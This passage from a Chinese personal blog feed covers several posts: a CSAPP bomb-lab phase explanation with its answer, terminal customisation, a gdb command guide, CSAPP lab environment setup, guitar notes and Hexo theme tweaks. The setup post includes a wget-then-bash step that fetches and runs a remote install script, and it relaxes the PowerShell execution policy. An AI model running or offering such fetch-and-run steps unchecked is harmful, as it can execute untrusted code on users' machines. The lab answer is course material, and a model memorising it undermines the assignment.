0x0000000000000000      0x00000000000000000x603250 &lt;n42&gt;: 0x0000000000000007      0x00000000000000000x603260 &lt;n42+16&gt;:      0x0000000000000000      0x00000000000000000x603270 &lt;n43&gt;: 0x0000000000000014      0x00000000000000000x603280 &lt;n43+16&gt;:      0x0000000000000000      0x00000000000000000x603290 &lt;n46&gt;: 0x000000000000002f      0x00000000000000000x6032a0 &lt;n46+16&gt;:      0x0000000000000000      0x00000000000000000x6032b0 &lt;n48&gt;: 0x00000000000003e9      0x00000000000000000x6032c0 &lt;n48+16&gt;:      0x0000000000000000      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大家通过代码的翻译,能梳理出以下几点</p><p>目的:这个递归是对链表的递归,每一个节点都有两个指针,所以每个节点都对应着另外两个节点,我们把这个节点根据指针的顺序画出一颗树,把指针1放左边,指针二放右边,得到如下一张图.</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071305660.jpg"></p><p>注:左下是指针一的节点,右边&#x3D;下是指针2的节点</p><p>然后梳理一遍代码规则(val为节点的值,num为输入的数字)</p><ol><li>若val&lt;num ,走右边的节点,return 时的返回值要*2+1</li><li>若val&gt;num,走左边的节点,return 时的返回值要*2</li><li>若val&#x3D;num,return 0</li></ol><p>然后我们一步一步的令num&#x3D;every val,把return的值算出来,确定是2的情况就好了</p><p>答案:0x14 和 0x16</p><h2 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h2><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071308029.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win美化fluent terminal总结</title>
      <link href="/2024/01/18/fluent_use/"/>
      <url>/2024/01/18/fluent_use/</url>
      
        <content type="html"><![CDATA[<blockquote><p>用命令行安装了无数次oh-my-posh,我无奈大喊holy-shit!</p></blockquote><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><blockquote><p>官方文档：<a href="https://ohmyposh.dev/">https://ohmyposh.dev/</a></p></blockquote><p>安装oh-my-posh和fluent terminal。在微软商店安装，多试几次就成功了！</p><p>现在的oh-my-posh可以直接从Microsoft Store下载exe文件安装了，别去折腾命令行的命令了，速度太慢了。<br>安装完成后，如果是windows系统，推荐Windows Terminal（没有的话在Microsoft Store里安装）下启动powershell,推荐在商店中下载安装<code>fluent terminal</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205681.png" alt="image-20240225214958894"></p><h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p>配置oh-my-posh过程中比较复杂的点就是Nerd Font和Themes这两点：</p><h3 id="1-Nerd-Font"><a href="#1-Nerd-Font" class="headerlink" title="1.Nerd Font"></a>1.Nerd Font</h3><p>去下面的网站下载一个名字里面带NF的字体，windows下直接安装，其他系统参照网站说明。</p><blockquote><p>下载地址：<a href="https://www.nerdfonts.com/">https://www.nerdfonts.com/</a></p></blockquote><p>或者<a href="https://link.zhihu.com/?target=https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/Meslo.zip">点击下载</a>然后解压全选安装</p><h3 id="2-Themes"><a href="#2-Themes" class="headerlink" title="2.Themes"></a>2.Themes</h3><h4 id="step1：设置字体"><a href="#step1：设置字体" class="headerlink" title="step1：设置字体"></a>step1：设置字体</h4><p>用管理员身份打开Fluent Terminal，在界面中按下 ctrl+ shift+，后，会打开一个界面</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img//202402252205681.png" alt="image-20240225215041822"></p><p>选择终端,更改字体</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205721.png" alt="image-20240225215109949"></p><p>记得保存，新开一个窗口,看字体改变.</p><h4 id="step2-更改主题"><a href="#step2-更改主题" class="headerlink" title="step2:更改主题"></a>step2:更改主题</h4><ol><li>启动oh-my-posh</li></ol><p>输入如下命令，下面的命令会先检查配置文件存不存在，如果不存在才创建：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token variable">$PROFILE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">New-Item</span> <span class="token operator">-</span>Path <span class="token variable">$PROFILE</span> <span class="token operator">-</span><span class="token function">Type</span> File <span class="token operator">-</span>Force<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接下来，打开配置文件（以下示例展示的是使用记事本进行操作）。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">notepad <span class="token variable">$PROFILE</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先试着输入以下命令：</p><p>记得将用户名替换为自己的用户名。</p><pre class="line-numbers language-none"><code class="language-none">oh-my-posh init pwsh --config C:\Users\用户名\AppData\Local\Programs\oh-my-posh\themes\catppuccin.omp.json |Invoke-Expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新开一个窗口,看脚本有无运行.</p><blockquote><p>若出现以下错误:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">无法加载文件C<span class="token operator">:</span>\Users\xxx\Documents\WindowsPowerShell\profile<span class="token punctuation">.</span>ps1，因为在此系统上禁止运行脚本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解决方案：</p><p>win+x（或右键任务栏的Windows图标），选择以管理员身份运行powershell（Windows终端)&#x2F;Fluent Terminal，输入以下命令，重新打开终端即可成功执行</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Set</span><span class="token operator">-</span>ExecutionPolicy <span class="token operator">-</span>ExecutionPolicy RemoteSigned<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><ol start="2"><li>更换主题</li></ol><p>输入以下命令查看主题,会看到噼里啪啦一大堆主题样式都会蹦出来，选一个喜欢的</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Get<span class="token operator">-</span>PoshThemes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后会得到所有主题的路径</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402252205758.png" alt="image-20240225215638983"></p><p>复制路径,在这里比如我想使用<code>catppuccin</code>的主题,那么我就输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">notepad <span class="token variable">$profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后更改命令为如下路径</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img//202402252205792.png" alt="image-20240225215821096"></p><p>新开一个窗口,观察主题有无发生改变,在这个过程中很可能会出现一些图标不显示，显示一半，或者各种方框乱码，那都是字体的问题，多重启windows Terminal几次，总会成功的。</p><h3 id="3-方向键补全-tab"><a href="#3-方向键补全-tab" class="headerlink" title="3.方向键补全+tab"></a>3.方向键补全+tab</h3><p>用管理员身份打开终端输入</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Install<span class="token operator">-</span>Module PSReadLine  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若出现如下提示：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404212306425.png" alt="image-20240421230608222"></p><p>则输入以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Install-Module PSReadLine <span class="token parameter variable">-f</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>依据提示进行安装,安装完后配置文件</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">notepad $profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入以下命令保存</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Shows navigable menu of all options when hitting Tab</span></span>Set<span class="token operator">-</span>PSReadlineKeyHandler <span class="token operator">-</span>Key Tab <span class="token operator">-</span>Function MenuComplete<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Autocompletion <span class="token keyword">for</span> arrow keys</span></span>Set<span class="token operator">-</span>PSReadlineKeyHandler <span class="token operator">-</span>Key UpArrow <span class="token operator">-</span>Function HistorySearchBackwardSet<span class="token operator">-</span>PSReadlineKeyHandler <span class="token operator">-</span>Key DownArrow <span class="token operator">-</span>Function HistorySearchForward<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">auto</span> <span class="token expression">suggestions</span></span>Import<span class="token operator">-</span>Module PSReadLineSet<span class="token operator">-</span>PSReadLineOption <span class="token operator">-</span>PredictionSource History<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存后退出,再开一个窗口输入字母,看有无历史记录.</p><h2 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h2><p>少折腾,好看,能用就行</p>]]></content>
      
      
      <categories>
          
          <category> EATPOOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fluent </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gdb使用指北</title>
      <link href="/2024/01/17/gdb_use/"/>
      <url>/2024/01/17/gdb_use/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里陈述的用法主要是为了反汇编和bomblab所服务(至少在目前是)</p></blockquote><h2 id="gdb用法指北"><a href="#gdb用法指北" class="headerlink" title="gdb用法指北"></a>gdb用法指北</h2><p>GDB（GNU Debugger）是一个强大的调试工具，用于分析和调试程序。以下是一些GDB的基础命令：</p><p><strong>启动程序：</strong></p><pre class="line-numbers language-none"><code class="language-none">gdb &lt;executable&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动GDB并加载要调试的可执行文件。</p><p><strong>设置断点：</strong></p><pre class="line-numbers language-none"><code class="language-none">break &lt;function_name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在指定的函数内设置断点，使程序在该函数内停止执行。</p><pre class="line-numbers language-none"><code class="language-none">break &lt;line_number&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在指定行号上设置断点。</p><p><strong>运行程序：</strong></p><pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行程序，直到遇到断点或程序结束。</p><p><strong>单步执行：</strong></p><pre class="line-numbers language-none"><code class="language-none">stepi  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单步执行程序，进入函数内部。</p><pre class="line-numbers language-none"><code class="language-none">next<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单步执行程序，不进入函数内部，直到函数调用结束。</p><p><strong>完成当前函数</strong></p><pre class="line-numbers language-none"><code class="language-none">finish<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>查看变量的值：</strong></p><pre class="line-numbers language-none"><code class="language-none">print &lt;variable&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打印指定变量的值。</p><p><strong>查看堆栈帧：</strong></p><pre class="line-numbers language-none"><code class="language-none">backtrace<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打印当前调用堆栈的信息。</p><p><strong>切换到指定帧：</strong></p><pre class="line-numbers language-none"><code class="language-none">frame &lt;frame_number&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>切换到指定的堆栈帧。</p><p><strong>继续执行程序：</strong></p><pre class="line-numbers language-none"><code class="language-none">continue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从当前位置继续执行程序，直到遇到下一个断点或程序结束。</p><p><strong>查看符号表</strong></p><pre class="line-numbers language-none"><code class="language-none">objdump -t bomb | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>反编译炸弹</strong></p><pre class="line-numbers language-none"><code class="language-none">objdump -d bomb &gt; bomb.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>退出GDB：</strong></p><pre class="line-numbers language-none"><code class="language-none">quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退出GDB。</p><h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><ol><li><p><strong>反汇编函数：</strong></p><pre class="line-numbers language-none"><code class="language-none">disassemble &lt;function_name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示指定函数的汇编代码。</p></li><li><p><strong>反汇编当前代码：</strong></p><pre class="line-numbers language-none"><code class="language-none">disassemble<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以缩写为</p><pre class="line-numbers language-none"><code class="language-none">disas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示当前执行点附近的汇编代码。</p></li><li><p><strong>设置反汇编指令数目：</strong></p><pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor &lt;flavor&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置反汇编输出的指令数目。<code>&lt;flavor&gt;</code> 可以是 <code>att</code> 或 <code>intel</code>，表示使用AT&amp;T或Intel语法。</p></li><li><p><strong>查看寄存器值：</strong></p><pre class="line-numbers language-none"><code class="language-none">info registers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示当前寄存器的值。</p></li><li><p><strong>在反汇编中设置断点：</strong></p><pre class="line-numbers language-none"><code class="language-none">break *&lt;address&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在指定地址处设置断点，可以是汇编指令的地址。</p></li><li><p><strong>查看内存内容：</strong></p><pre class="line-numbers language-none"><code class="language-none">x&#x2F;&lt;n&gt;x &lt;address&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示从指定地址开始的 <code>n</code> 个十六进制字节。例如，<code>x/4x $rsp</code> 显示栈顶部的四个字节。</p></li><li><p><strong>查看指令执行前后的内存变化：</strong></p><pre class="line-numbers language-none"><code class="language-none">display&#x2F;i $pc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>每次程序停下来时，显示当前指令的反汇编，并在每步执行后继续显示。</p></li><li><p><strong>进入&#x2F;离开汇编级别：</strong></p><pre class="line-numbers language-none"><code class="language-none">layout asm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入汇编级别的布局，显示源代码和汇编代码。可以使用 <code>Ctrl+X</code>，然后按 <code>2</code> 来切换到汇编级别。</p></li><li><p><strong>设置汇编级别布局显示选项：</strong></p><pre class="line-numbers language-none"><code class="language-none">set asm-options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置汇编级别布局的显示选项，例如，<code>set asm-options intel</code> 切换到Intel语法。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> EATPOOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP环境配置</title>
      <link href="/2024/01/14/csapp_environment/"/>
      <url>/2024/01/14/csapp_environment/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker安装Csapp环境"><a href="#Docker安装Csapp环境" class="headerlink" title="Docker安装Csapp环境"></a>Docker安装Csapp环境</h1><blockquote><p>注意：arm64架构的cpu使用docker会安装arm 64 架构的ubuntu，而有论文表明arm64架构的ubuntu不支持gcc -m32的参数编译，建议使用m系列芯片的macbook放弃配置csapp环境或者使用Vmware box安装虚拟机尝试配置!</p></blockquote><ol><li>打开Docker，打开CMD（windows）或者终端（mac），刷入以下命令拉取镜像。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载镜像</span><span class="token function">docker</span> pull linxi177229/csapp:latest<span class="token comment"># 查看</span><span class="token function">docker</span> images<span class="token comment"># 启动容器（里面有配置好的环境 和 PDF 资料）</span><span class="token function">docker</span> run <span class="token parameter variable">--name</span> csapp <span class="token parameter variable">-itd</span> linxi177229/csapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><p>打开VsCode，在扩展市场安装Docker插件，然后进入，右键对应容器，选择<strong>附加VisualStudioCode</strong>，然后vscode会自动挂载容器，会弹出一个新的窗口。</p></li><li><p>开始愉快的实验吧！</p></li><li><p>测试环境</p><pre class="line-numbers language-none"><code class="language-none"># 接下来就和使用 平常的 Ubuntu：20.04 一样了# 进入 lab1 进行一个简单的测试cd ~lscd csapplabcd datalab&#x2F;datalab-handoutmake clean &amp;&amp; make &amp;&amp; .&#x2F;btest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>GDB安装（bomblab需要使用）</p></li></ol><p>在这个doker中默认是没有安装gdb的,所以为了在bomblab中进行gdb的使用,我们需要在doker中安装gdb,该doker镜像是基于ubuntu20.04的,故我们直接在终端使用命令</p><pre class="line-numbers language-none"><code class="language-none">apt-get updateapt-get install  gdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装好后,cd到bomb的文件夹内,输入</p><pre class="line-numbers language-none"><code class="language-none">gdb bomb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后开始实验吧!<del>这个点废了我一个晚上才弄明白</del></p><h1 id="Ubuntu安装CSAPP环境"><a href="#Ubuntu安装CSAPP环境" class="headerlink" title="Ubuntu安装CSAPP环境"></a>Ubuntu安装CSAPP环境</h1><ol><li><p>虚拟机 安装 Ubuntu20.04，这个比较简单，找一篇博客就行，**不过记得用 VMware pro 16，很方便 ssh，</p></li><li><p>CSAPP 环境配置，首先如果你用的是 Ubuntu20.04 及以下，那么你可以直接运行下面的脚本，就可以安装好 操作都很简单，就几行命令而已，Docker 方法适用性更加广，目前大多数操作系统都支持。</p></li></ol><p>这个脚本是 20.04 及以下都可以完全配置好的，并且有附带的 PDF，如果是 Ubuntu 21及 以上需要在 lab4 的时候降低 gcc 版本。</p><p>选择自己想要做项目的文件夹,cd到文件夹中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 下载脚本</span><span class="token function">wget</span> https://gitee.com/lin-xi-269/csapplab/raw/origin/installAll.sh <span class="token comment"># 运行脚本</span><span class="token function">bash</span> installAll.sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>运行完 这个脚本之后，<strong>会在 当前目录下创建一个 csapp 文件夹，里面包含 8个 lab 按照 PDF 开始做即可以开始做了。</strong></li></ol><p>然后可以用vscode远程链接ubuntu,通过ssh,然后测试环境</p><pre class="line-numbers language-none"><code class="language-none"># 接下来就和使用 平常的 Ubuntu：20.04 一样了# 进入 lab1 进行一个简单的测试cd ~lscd csapplabcd datalab&#x2F;datalab-handoutmake clean &amp;&amp; make &amp;&amp; .&#x2F;btest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Mac-Chip-安装CSAPP环境"><a href="#Mac-Chip-安装CSAPP环境" class="headerlink" title="Mac Chip 安装CSAPP环境"></a>Mac Chip 安装CSAPP环境</h1><h2 id="拉取Ubuntu18-04"><a href="#拉取Ubuntu18-04" class="headerlink" title="拉取Ubuntu18.04"></a>拉取Ubuntu18.04</h2><pre class="line-numbers language-none"><code class="language-none">docker pull ubuntu:18.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建Ubuntu-x86-容器"><a href="#创建Ubuntu-x86-容器" class="headerlink" title="创建Ubuntu(x86)容器"></a>创建Ubuntu(x86)容器</h2><p>Docker默认创建的是arm架构的Ubuntu，如果没有指定为amd64，将无法安装gcc -m32</p><pre class="line-numbers language-none"><code class="language-none">docker run  -it --platform linux&#x2F;amd64 --name&#x3D;csapp ubuntu:18.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><code>-v</code> 或 <code>--volume</code> 参数用于挂载宿主机上的目录或文件到容器内。但是，在您的命令中，<code>-v</code> 后面没有直接跟任何值，这是不正确的。您应该指定要挂载的宿主机路径和容器内路径，例如 <code>-v /host/path:/container/path</code>。</li><li><strong><code>--platform linux/amd64</code></strong>：<br>这个参数指定了容器运行的平台架构。如果您的 Docker 主机支持多平台，并且您想确保在 AMD64 架构上运行容器，这个参数是正确的。但是，如果 Docker 主机本身就是 AMD64 架构，这个参数通常是可选的，因为 Docker 默认会在与主机相同的架构上运行容器。</li><li><strong>命令的其余部分</strong>：<br><code>-it</code> 用于以交互模式运行容器，并分配一个伪终端。<code>--name csapp</code> 指定了容器的名称。<code>ubuntu:18.04</code> 是您要运行的镜像名称。</li></ol><p>我用VSC进行附加，所以就不挂载本地容器了。</p><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><ol><li>更新apt软件源</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装sudo</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get install sudo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>安装c&#x2F;c++编译环境</li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install build-essential<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>补充gcc的完整环境(gcc-multilib)</li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install gcc-multilib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>安装gdb</li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install gdb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>据说GDB还使用不了，但我这十天是在家里面使用mac完成任务，所以会尽力克服问题，速通malloclab然后转战区块链！</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/weixin_52693116/article/details/133149517">MacOS(M1)下创建Docker Ubuntu容器搭建CSAPP实验环境并运行_docker配置csapp环境-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/502375486?utm_id=0">Mac M1配置Docker CentOS（x86）的CSAPP实验环境 - 知乎 (zhihu.com)</a></p><h1 id="环境安装时的截图"><a href="#环境安装时的截图" class="headerlink" title="环境安装时的截图"></a>环境安装时的截图</h1><p>下面的截图是包括了用docker配置xv6环境</p><h2 id="CMD截图"><a href="#CMD截图" class="headerlink" title="CMD截图"></a>CMD截图</h2><p><a href="https://pic.imgdb.cn/item/65a3b395871b83018aa824cd.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315215.jpg"></a></p><h2 id="Docker截图"><a href="#Docker截图" class="headerlink" title="Docker截图"></a>Docker截图</h2><p><a href="https://pic.imgdb.cn/item/65a3b5d3871b83018aafffff.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315227.jpg"></a></p><h2 id="Vscode截图"><a href="#Vscode截图" class="headerlink" title="Vscode截图"></a>Vscode截图</h2><p><a href="https://pic.imgdb.cn/item/65a3b64c871b83018ab1ab98.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315236.jpg"></a></p><blockquote><p>配置环境主打一个能用就好，不要过多的纠结。</p></blockquote><h1 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h1><p>菜就多练，输不起就别玩</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guitar_learn</title>
      <link href="/2024/01/10/guitar_learn/"/>
      <url>/2024/01/10/guitar_learn/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这几日学了吉他，试图看到吉他的大门，才恍然间发现自己的音准很差，听不出音，每天也不怎么练琴，断断续续练了十几二十天，勉强把爱的罗曼史弹完，现在脱离了<a href="https://space.bilibili.com/87918598/channel/collectiondetail?sid=185860">吉他大学霸的基础课</a>,转而投向了<a href="https://space.bilibili.com/326251291/channel/collectiondetail?sid=434227&ctype=0">元子弹吉他</a>的基础课,主要是感觉吉他大学霸讲的属实是找不到什么练琴的快感，太枯燥了，练琴是为了开心，就应该去弹曲子，这才是正路，有着强烈的正反馈，而不是天天练基本功折磨自己。目前已经在击弦努力了，预计是每天练会一门课，同时对之前的课程谱子进行复习，争取稳扎稳打，每日都有练习</p><h3 id="会的曲子"><a href="#会的曲子" class="headerlink" title="会的曲子"></a>会的曲子</h3><ol><li><a href="https://www.bilibili.com/video/BV1Vb411c7x5/">《爱的罗曼史》</a></li><li><a href="https://www.bilibili.com/video/BV1x4411U7n7/">《少年的梦》</a></li><li>正在练习<a href="https://www.bilibili.com/video/av50052102/">&lt;&lt;无题&gt;&gt;</a></li></ol><p>10.4更新：</p><p>服气了，从3月初到现在10月份还是没有搞定无题，中途中断了好长的一段时间，这两天才偶尔弹一弹，小问题，呸，大问题！</p><p>喜欢的频道</p><ul><li><p><a href="https://space.bilibili.com/28239752/video">苍小天</a></p></li><li><p><a href="https://space.bilibili.com/3546593768770315/video">Marcin</a><del>他终于来b站了!!!</del></p></li><li><p><a href="https://space.bilibili.com/326251291/video">元子弹吉他</a></p></li></ul><h3 id="喜欢的曲子"><a href="#喜欢的曲子" class="headerlink" title="喜欢的曲子"></a>喜欢的曲子</h3><ol><li><p><a href="https://www.bilibili.com/video/BV1Yt411w73S?p=31&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">marcin patrzalek美国达人秀（命运交响曲和toxicity)</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1Yt411w73S?p=33&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">marcin patrzalek-Moonlight Sonata(月光奏鸣曲)</a></p></li></ol><h3 id="Good-Lucky"><a href="#Good-Lucky" class="headerlink" title="Good Lucky"></a>Good Lucky</h3><blockquote><p>愿能有所成长，有所进步</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PLAY </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记，guitar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+next优化搜集整理</title>
      <link href="/2023/12/22/theme_better/"/>
      <url>/2023/12/22/theme_better/</url>
      
        <content type="html"><![CDATA[<blockquote><p>以下是自己在研究NEXT主题的时候想要完善自己的主题搜寻的整理的方法</p></blockquote><h2 id="添加阅读时间字数提示"><a href="#添加阅读时间字数提示" class="headerlink" title="添加阅读时间字数提示"></a>添加阅读时间字数提示</h2><p>效果如图：</p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318548.jpg" alt="blob"><ol><li>git 黑窗口中输入以下命令：</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">npm install hexo-symbols-count-time<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong>在blog的根目录的 _config中 复制下面这段话到末尾</strong></li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">symbols_count_time</span><span class="token operator">:</span>  <span class="token literal-property property">symbols</span><span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token literal-property property">time</span><span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token literal-property property">total_symbols</span><span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token literal-property property">total_time</span><span class="token operator">:</span> <span class="token boolean">true</span>  <span class="token literal-property property">exclude_codeblock</span><span class="token operator">:</span> <span class="token boolean">false</span>  <span class="token literal-property property">awl</span><span class="token operator">:</span> <span class="token number">2</span>      <span class="token literal-property property">wpm</span><span class="token operator">:</span> <span class="token number">275</span>  <span class="token literal-property property">suffix</span><span class="token operator">:</span> <span class="token string">"mins."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>在 <strong>主题的 config文件中找到，并且 输入 true即可，效果可以自行查看。</strong></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318577.jpg" alt="blob"></p><h2 id="添加网站运行时间"><a href="#添加网站运行时间" class="headerlink" title="添加网站运行时间"></a>添加网站运行时间</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">F:\hexo\blog\themes\next\layout\_partials\footer.swig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<strong>文件的末尾</strong>复制粘贴以下内容：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 网站运行时间的设置 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>span id<span class="token operator">=</span><span class="token string">"timeDate"</span><span class="token 